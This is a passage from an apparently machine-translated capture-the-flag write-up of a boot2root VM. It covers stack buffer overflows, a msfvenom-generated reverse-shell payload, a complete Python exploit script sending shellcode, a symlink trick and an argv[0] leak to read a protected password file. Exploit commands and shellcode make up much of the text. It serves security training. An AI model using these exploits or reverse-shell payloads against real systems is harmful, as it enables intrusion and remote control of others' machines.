style="vertical-align: inherit;">Reading the files is good, but there is still overflow and buffer overflow. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here it should be noted that the function </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strlen</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , according to the specification, returns the number of characters before the first occurrence of the terminator zero. Therefore, by adding the terminator zero to the input line with 7 characters, it is possible to bypass the overflow. Check it out:</font></font><br><br><pre> <code class="bash hljs">$ python -c <span class="hljs-string"><span class="hljs-string">'print("\x02\x02" + "A"*20 + "\x00"*7 + "123456B"*200)'</span></span> | ltrace ./base64.bin</code> </pre> <br><img src="https://habrastorage.org/files/5a7/e03/dee/5a7e03deed694356ae1b8f23059bcda6.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As you can see, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strlen</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> returned 20, and </font><font style="vertical-align: inherit;">everything was copied to the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">data</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> buffer </font><font style="vertical-align: inherit;">starting with </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Äú123456B‚Äù</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It remains to find the offset, on which the return address is located on the stack, and rewrite it. </font><font style="vertical-align: inherit;">We will </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">overwrite the</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> address </font><i><font style="vertical-align: inherit;">0x600de0</font></i><font style="vertical-align: inherit;"> , which is the array </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">to_write</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">You can find the return address with the following command:</font></font><br><br><pre> <code class="bash hljs">$ python -c <span class="hljs-string"><span class="hljs-string">'print("\x02\x02" +"A"*20 + "\x00"*7 + "A"*536 + "\xe0\x0d\x60\x00\x00\x00" + "\x00"*2000)'</span></span> | gdb -ex <span class="hljs-string"><span class="hljs-string">"run"</span></span> -ex <span class="hljs-string"><span class="hljs-string">"q"</span></span> ./base64.bin</code> </pre> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS The value of 536 was obtained experimentally, during the selection, taking into account that the final buffer has a size of 500 bytes. </font></font></i> <br><br><img src="https://habrastorage.org/files/b0c/c2e/014/b0cc2e014ca54ef18547c8f1b4f6b340.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Everything you need to write an exploit is available, it's time to start this. </font><font style="vertical-align: inherit;">Using </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from the Metaspoit Framework set, we will generate a shell:</font></font><br><br><pre> <code class="bash hljs">$ sudo msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.124 LPORT=9999 -f python -b <span class="hljs-string"><span class="hljs-string">"\x00\x0a\x0d"</span></span> &gt; exploit2.py</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Start the handler: </font><i><font style="vertical-align: inherit;">Edit the exploit2.py</font></i></font><br><br><img src="https://habrastorage.org/files/528/19e/63a/52819e63a19c4f32a812b75018ed3984.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> file a </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bit</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploit2.py</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import socket import time import sys import struct port = 6969 host = "192.168.1.190" bypass = "\x02\x02" + "A"*20 + "\x00"*7 buf = "" buf += "\x48\x31\xc9\x48\x81\xe9\xf7\xff\xff\xff\x48\x8d\x05" buf += "\xef\xff\xff\xff\x48\xbb\x8b\xe0\xc2\x5c\x5b\xbf\x3d" buf += "\x9b\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4" buf += "\xc3\xd1\x3d\x36\x52\xe7\xa4\x2d\x9b\xa8\x4b\x8a\x16" buf += "\x8e\xf4\xf1\xa9\xa1\x98\xee\x5c\xb0\x38\xcd\xdb\x8a" buf += "\xeb\x04\xc2\xd5\x3f\xc4\xe1\xe1\x9c\x53\x5e\xf7\xaa" buf += "\xd3\x32\xe2\xc2\x7b\x54\x7f\x95\x9a\xf7\xb1\x8a\xd5" buf += "\xbd\xd5\x2d\xc1\xe1\xca\x9a\x53\x5e\xe6\x63\xc1\x84" buf += "\xe5\x3d\xba\x5b\xbf\x3d\x9b" payload = bypass + buf + "\x90"*(536-len(buf)) payload += "\xe0\x0d\x60\x00\x00\x00\x00\x00" + "\x00"*2000 def bof(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(payload) s.close() w = open('payload', 'wb') w.write(payload) w.close() bof()</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> And after launch, we get the long-awaited shell: </font></font><br><br><pre> <code class="bash hljs">$ python2 ./exploit2.py</code> </pre> <br><img src="https://habrastorage.org/files/3b9/06f/c3c/3b906fc3c8644497a2795d5ae4ee3953.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Let's try to find more flags: </font></font><br><br><pre> <code class="bash hljs">find / -name flag.txt 2&gt;/dev/null /home/bob/filez/flag.txt /flag.txt</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Looking into the directory with the flag, it becomes clear that even here we cannot do without reverse: </font></font><br><br><pre> <code class="bash hljs">ls -ahl /home/bob/filez total 24K drwxr-xr-x 2 charlie charlie 4.0K Oct 25 04:07 . drwxr-xr-x 5 bob bob 4.0K Oct 25 04:21 .. -r--r----- 1 charlie charlie 50 Oct 25 03:51 auth.txt -r--r----- 1 charlie charlie 29 Oct 23 08:06 flag.txt -rwsr-xr-x 1 charlie charlie 6.7K Oct 25 03:45 flag_vault</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ok, download </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flag_vault</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> for further analysis. </font><font style="vertical-align: inherit;">At the same time, check the availability of ASLR on the remote machine:</font></font><br><br><pre> <code class="bash hljs">cat /proc/sys/kernel/randomize_va_space 2</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> The file was downloaded, and as it turned out has protection: </font></font><br><br><pre> <code class="bash hljs">$ gdb -q ./flag_vault Reading symbols from ./flag_vault...(no debugging symbols found)...<span class="hljs-keyword"><span class="hljs-keyword">done</span></span>. gdb-peda$ checksec CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : disabled gdb-peda$</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In IDA, this file looks like this: </font></font><br><br><img src="https://habrastorage.org/files/b2c/fc6/c0f/b2cfc6c0f3a9456ea5e240d0922f5087.PNG"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It is worth saying that there are 2 ways to take a flag: easy, and more complex. </font><font style="vertical-align: inherit;">Consider them both:</font></font><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 1. The way cheater </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As you can see, the file paths are relative. </font><font style="vertical-align: inherit;">This means that we can create </font><font style="vertical-align: inherit;">an </font><i><font style="vertical-align: inherit;">auth.txt</font></i><font style="vertical-align: inherit;"> file </font><font style="vertical-align: inherit;">with our verification code </font><font style="vertical-align: inherit;">in the home directory of the user </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">alice</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font><font style="vertical-align: inherit;">and next to create a link to the original file </font><i><font style="vertical-align: inherit;">/home/bob/filez/flag.txt</font></i><font style="vertical-align: inherit;"> Next, go to the </font><i><font style="vertical-align: inherit;">/ home / alice</font></i><font style="vertical-align: inherit;"> directory </font><font style="vertical-align: inherit;">, run the file </font><i><font style="vertical-align: inherit;">/ home / bob / filez / flag_vault</font></i><font style="vertical-align: inherit;"> , enter your code, which is checked with our file </font><i><font style="vertical-align: inherit;">auth.txt</font></i><font style="vertical-align: inherit;"> and get the flag:</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i> <br><br><img src="https://habrastorage.org/files/18d/8e7/eef/18d8e7eefbcd4fdb836f6fe6007acc9c.png"><br><br><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><br><br><img src="https://habrastorage.org/files/22a/e0b/851/22ae0b851fc74b35bb3624ef97e66c51.png"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 2. The path of the present reverse engineer </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After a long search, I came across a vulnerability in the </font></font><a href="https://web.nvd.nist.gov/view/vuln/detail%3FvulnId%3DCVE-2010-3192"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">__stack_chk_fail</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function </font><font style="vertical-align: inherit;">. Judging by the description, this is just our case, it remains to find the offset along which </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argv [0] is located</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and to try to rewrite it. Run this binary in the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">peda</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> : </font></font><br><br><img src="https://habrastorage.org/files/093/571/2af/0935712af5cf41b99e60d78e48a0d87d.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When running under debugging, it is noticeable that the nearest location of </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argv [0]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> can be found at: </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0xbffff794</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><pre> <code class="hljs xml"> 0x08048730 <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+293</span></span></span><span class="hljs-tag">&gt;</span></span>: lea eax,[ebp-0x110] 0x08048736 <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+299</span></span></span><span class="hljs-tag">&gt;</span></span>: push eax 0x08048737 <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+300</span></span></span><span class="hljs-tag">&gt;</span></span>: push 0x0 0x08048739 <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+302</span></span></span><span class="hljs-tag">&gt;</span></span>: call 0x8048460 <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">read@plt</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function </font><font style="vertical-align: inherit;">starts filling the stack at the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ebp-272</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> offset </font><font style="vertical-align: inherit;">, knowing that it‚Äôs not hard to calculate the offset: (0xbffff794 - 0xbffff6e8 - 272) = 444 characters, which you can rewrite </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argv [0]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Great, now theoretically we can read the memory of the current process. </font><font style="vertical-align: inherit;">If you look at the code, you will notice that the files are read into static variables:</font></font><br><br><pre> <code class="hljs css"><span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:080486E8</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">push</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">modes</span></span> ; "<span class="hljs-selector-tag"><span class="hljs-selector-tag">r</span></span>" <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:080486ED</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">push</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">aAuth_txt</span></span> ; "<span class="hljs-selector-tag"><span class="hljs-selector-tag">auth</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.txt</span></span>" <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:080486F2</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">call</span></span> _<span class="hljs-selector-tag"><span class="hljs-selector-tag">fopen</span></span> <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:080486F7</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">add</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">esp</span></span>, 16 <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:080486FA</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">mov</span></span> <span class="hljs-selector-attr"><span class="hljs-selector-attr">[ebp+var_114]</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">eax</span></span> <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:08048700</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">sub</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">esp</span></span>, 4 <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:08048703</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">push</span></span> <span class="hljs-selector-attr"><span class="hljs-selector-attr">[ebp+var_114]</span></span> ; <span class="hljs-selector-tag"><span class="hljs-selector-tag">stream</span></span> <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:08048709</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">push</span></span> 60 ; <span class="hljs-selector-tag"><span class="hljs-selector-tag">n</span></span> <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:0804870B</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">push</span></span> 8049<span class="hljs-selector-tag"><span class="hljs-selector-tag">CE0h</span></span> ; <span class="hljs-selector-tag"><span class="hljs-selector-tag">pass</span></span> <span class="hljs-selector-class"><span class="hljs-selector-class">.text</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:08048710</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">call</span></span> _<span class="hljs-selector-tag"><span class="hljs-selector-tag">fgets</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In this case, the most interesting will be the value at the address </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x8049CE0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , since that is where the contents of the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">auth.txt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> file are </font><i><font style="vertical-align: inherit;">read</font></i><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Check it out:</font></font><br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">'import struct;print("A"*20 + "\x00"*424 + struct.pack("&lt;I",0x8049CE0))'</span></span> | ./flag_vault</code> </pre> <br><img src="https://habrastorage.org/files/114/a7c/b12/114a7cb1239543dc9b4e5c973b9f71a1.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Great, we have a password, you can get the flag: </font></font><br><br><img src="https://habrastorage.org/files/b4c/110/c3c/b4c110c3cd6a4fb7a73896f35832f3df.png"><br><br><h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Flag 4 (charlie) </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> After long attempts to increase privileges through this application, as well as search for other options, I hammered the command: </font></font><br><br><pre> <code class="bash hljs">find / -user alice 2&gt;/dev/null | grep -v proc /home/alice /home/alice/ctftp /home/alice/.profile /home/alice/auth.txt /home/alice/.bash_history /home/alice/.bashrc /home/alice/flag.txt /home/alice/.bash_logout /var/mail/alice /flag.txt</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Hmm, looking at the mail, it becomes clear where to go next: </font></font><br><br><pre> <code class="bash hljs">cat /var/mail/alice</code> </pre> <br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Message from bob</font></font></b> <div class="spoiler_text"><blockquote> From bob@baffle.me Thu Jan 2 11:38:22 2014 <br> Return-Path: &lt;root@baffle.me&gt; <br> X-Original-To: alice <br> Delivered-To: alice@baffle.me <br> Received: by baffle.me (Postfix, from userid 0) <br> id B612F2C0E36; Thu, 2 Jan 2014 11:38:22 -0800 (PST) <br> From: Bob &lt;bob@baffle.me&gt; <br> To: alice@baffle.me <br> Subject: Flag #2 <br> Message-Id: &lt;2014010204825.B612F2C0E36@baffle.me&gt; <br> Date: Thu, 2 Jan 2014 11:38:22 -0800 (PST) <br><br> Alice, <br><br> I need you to login to my account. My password is in /home/bob/flag.txt <br> You'll need to authenticate to Flag Vault in order to get its contents. <br><br>  - <br> Bob </blockquote><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Login using ssh, and immediately attention is drawn to the .bash_history file </font></font><br><br><pre> <code class="bash hljs">bob@baffle:~$ cat .bash_history</code> </pre> <br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.bash_history</font></font></b> <div class="spoiler_text"><pre> <code class="bash hljs">ls -la cat .plan <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> binz/ ls -la <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> .. ls ls -la ps -efa <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> ls -latr whoami su - charlie my_kn1ck3rz_r_bunch3d <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> filez/ ls -altr date <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> .. ls -latr clear ls <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> binz/ ls <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> .. ls <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The phrase </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Äúmy_kn1ck3rz_r_bunch3d‚Äù</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> unfortunately did not fit as a password, but still save it for now, the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.plan</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> file </font><font style="vertical-align: inherit;">also helped a little, but in the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">binz</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> directory </font><font style="vertical-align: inherit;">, a certain demon awaits its fate: </font></font><br><br><img src="https://habrastorage.org/files/473/b9d/7bc/473b9d7bce5e4d299b666cdd2a2a7bf1.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Look at what port it hangs:</font></font><br><br><pre> <code class="bash hljs">bob@baffle:~$ netstat -ln tcp 0 0 127.0.0.1:7979 0.0.0.0:* LISTEN</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> And actually try to connect to it: </font></font><br><br><pre> <code class="bash hljs">bob@baffle:~$ nc localhost 7979</code> </pre> <br><img src="https://habrastorage.org/files/932/e1c/ba0/932e1cba0cec4d5ba5b860e888578e95.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The flag is clearly the user of </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Charlie</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">It remains to get it. </font><font style="vertical-align: inherit;">Let's see what's inside this demon by opening it in IDA:</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">query_user (int fd)</font></font></b> <div class="spoiler_text"><pre> <code class="hljs mel">.<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 ; __int64 __fastcall query_user(<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> fd) .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 public query_user .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 query_user <span class="hljs-keyword"><span class="hljs-keyword">proc</span></span> near ; CODE XREF: main+<span class="hljs-number"><span class="hljs-number">10</span></span>D .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 fd = dword ptr <span class="hljs-number"><span class="hljs-number">-4E4</span></span>h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 file_cntx = qword ptr <span class="hljs-number"><span class="hljs-number">-4</span></span>D8h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 s = byte ptr <span class="hljs-number"><span class="hljs-number">-4</span></span>D0h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 var_4B0 = byte ptr <span class="hljs-number"><span class="hljs-number">-4</span></span>B0h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 <span class="hljs-keyword"><span class="hljs-keyword">file</span></span> = byte ptr <span class="hljs-number"><span class="hljs-number">-460</span></span>h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 buf = byte ptr <span class="hljs-number"><span class="hljs-number">-3</span></span>F0h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 var_8 = qword ptr <span class="hljs-number"><span class="hljs-number">-8</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B86 push rbp .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B87 mov rbp, rsp .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B8A sub rsp, <span class="hljs-number"><span class="hljs-number">4</span></span>F0h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B91 mov [rbp+fd], edi .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>B97 mov rax, fs:<span class="hljs-number"><span class="hljs-number">28</span></span>h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BA0 mov [rbp+var_8], rax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BA4 xor eax, eax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BA6 mov dword ptr [rbp+file_cntx], <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BB0 lea rax, [rbp+s] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BB7 mov edx, <span class="hljs-number"><span class="hljs-number">14</span></span>h ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BBC mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; c .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BC1 mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BC4 call _memset .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BC9 mov edx, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BCF lea rax, [rbp+s] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BD6 mov esi, offset <span class="hljs-keyword"><span class="hljs-keyword">format</span></span> ; <span class="hljs-string"><span class="hljs-string">"Socket fd: %d\n"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BDB mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BDE mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BE3 call _sprintf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BE8 lea rax, [rbp+s] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BEF mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BF2 call _strlen .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BF7 mov rdx, rax ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>BFA lea rcx, [rbp+s] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C01 mov eax, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C07 mov rsi, rcx ; buf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C0A mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C0C call _write .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C11 lea rax, [rbp+buf] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C18 mov edx, <span class="hljs-number"><span class="hljs-number">3E8</span></span>h ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C1D mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; c .<span class="hljs-keyword"><span 